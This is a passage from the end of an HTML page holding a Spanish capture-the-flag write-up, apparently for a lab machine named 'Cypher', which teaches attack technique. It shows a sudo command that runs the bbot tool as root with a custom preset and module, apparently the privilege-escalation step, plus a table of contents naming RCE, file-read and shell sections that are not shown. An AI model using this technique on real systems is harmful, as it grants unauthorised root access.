</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Ahora solo queda ejecutar el binario indicando el preset y el modulo a cargar</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">graphasm@cypher:~$ <span class="token function">sudo</span> /usr/local/bin/bbot <span class="token parameter variable">-p</span> ./preset.yml <span class="token parameter variable">-m</span> module
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20250306172750.png" src="Pasted image 20250306172750.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250306172750.png" src="machines/cypher/imgs/pasted-image-20250306172750.png"></span></p></div><div></div><div class="mod-footer mod-ui"></div></div></div></div></div></div></div></div></div></div><div class="sidebar-right sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="graph-view-wrapper"><div class="sidebar-section-header">Interactive Graph</div><div class="graph-view-placeholder">
		<div class="graph-view-container">
			<div class="graph-icon graph-expand" role="button" aria-label="Expand" data-tooltip-position="top"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></div>
			<canvas id="graph-canvas" class="hide" width="512px" height="512px"></canvas>
		</div>
		</div></div><div class="tree-container mod-root nav-folder tree-item outline-tree" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Table Of Contents</span><button class="clickable-icon collapse-tree-button" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-scroll-area tree-item-children nav-folder-children"><div class="tree-item mod-tree-folder nav-folder mod-collapsible is-collapsed" style="display: none;"></div><div class="tree-item" data-depth="1"><a class="tree-link" href="machines/cypher/cypher-exploitation.html#Nmap ports (TCP sCV)"><div class="tree-item-contents heading-link" heading-name="Nmap ports (TCP sCV)"><span class="tree-item-title">Nmap ports (TCP sCV)</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="machines/cypher/cypher-exploitation.html#Puerto_80"><div class="tree-item-contents heading-link" heading-name="Puerto 80"><span class="tree-item-title">Puerto 80</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-link" href="machines/cypher/cypher-exploitation.html#Fuzzing"><div class="tree-item-contents heading-link" heading-name="Fuzzing"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">Fuzzing</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/cypher/cypher-exploitation.html#HelloWorldProcedure"><div class="tree-item-contents heading-link" heading-name="HelloWorldProcedure"><span class="tree-item-title">HelloWorldProcedure</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/cypher/cypher-exploitation.html#[[CustomFunctions]]"><div class="tree-item-contents heading-link" heading-name="[[CustomFunctions]]"><span class="tree-item-title"><a data-href="CustomFunctions" href="CustomFunctions" class="internal-link" target="_blank" rel="noopener nofollow">CustomFunctions</a></span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="machines/cypher/cypher-exploitation.html#Neo4j"><div class="tree-item-contents heading-link" heading-name="Neo4j"><span class="tree-item-title">Neo4j</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="machines/cypher/cypher-exploitation.html#RCE"><div class="tree-item-contents heading-link" heading-name="RCE"><span class="tree-item-title">RCE</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-link" href="machines/cypher/cypher-exploitation.html#POC"><div class="tree-item-contents heading-link" heading-name="POC"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">POC</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/cypher/cypher-exploitation.html#sudo_-l"><div class="tree-item-contents heading-link" heading-name="sudo -l"><span class="tree-item-title">sudo -l</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/cypher/cypher-exploitation.html#FILE_READ"><div class="tree-item-contents heading-link" heading-name="FILE READ"><span class="tree-item-title">FILE READ</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-link" href="machines/cypher/cypher-exploitation.html#SHELL"><div class="tree-item-contents heading-link" heading-name="SHELL"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">SHELL</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/cypher/cypher-exploitation.html#POC"><div class="tree-item-contents heading-link" heading-name="POC"><span class="tree-item-title">POC</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div></div></div></div></div><script defer="">let rs = document.querySelector(".sidebar-right"); rs.classList.add("is-collapsed"); if (window.innerWidth > 768) rs.classList.remove("is-collapsed"); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></body></html>